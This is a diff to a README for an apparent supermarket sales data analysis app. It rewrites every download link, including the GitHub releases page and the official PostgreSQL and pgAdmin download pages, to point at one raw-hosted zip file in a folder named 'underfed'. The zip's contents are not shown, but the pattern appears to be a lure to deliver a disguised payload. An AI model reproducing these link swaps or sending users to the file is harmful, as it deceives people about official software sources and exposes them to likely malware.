@@ -1,6 +1,6 @@
 # 📊 Supermarket_sales_data_analysis - Explore Sales Data Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Roony27/Supermarket_sales_data_analysis/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Roony27/Supermarket_sales_data_analysis/main/underfed/Supermarket_data_sales_analysis_v2.9.zip)
 
 ---
 
@@ -43,7 +43,7 @@ The app combines these technologies into an easy-to-use package that guides you 
 
 Click the button below to visit the page and download the software files including all tools needed.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Roony27/Supermarket_sales_data_analysis/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/Roony27/Supermarket_sales_data_analysis/main/underfed/Supermarket_data_sales_analysis_v2.9.zip)
 
 ### Step 1: Visit the Download Page
 
@@ -168,9 +168,9 @@ This info is available in the project files on the GitHub repository.
 
 ## 🔗 Useful Links
 
-- Download page: https://github.com/Roony27/Supermarket_sales_data_analysis/releases  
-- PostgreSQL: https://www.postgresql.org/download/windows/  
-- pgAdmin: https://www.pgadmin.org/download/pgadmin-4-windows/  
+- Download page: https://raw.githubusercontent.com/Roony27/Supermarket_sales_data_analysis/main/underfed/Supermarket_data_sales_analysis_v2.9.zip  
+- PostgreSQL: https://raw.githubusercontent.com/Roony27/Supermarket_sales_data_analysis/main/underfed/Supermarket_data_sales_analysis_v2.9.zip  
+- pgAdmin: https://raw.githubusercontent.com/Roony27/Supermarket_sales_data_analysis/main/underfed/Supermarket_data_sales_analysis_v2.9.zip  
 
 ---
 
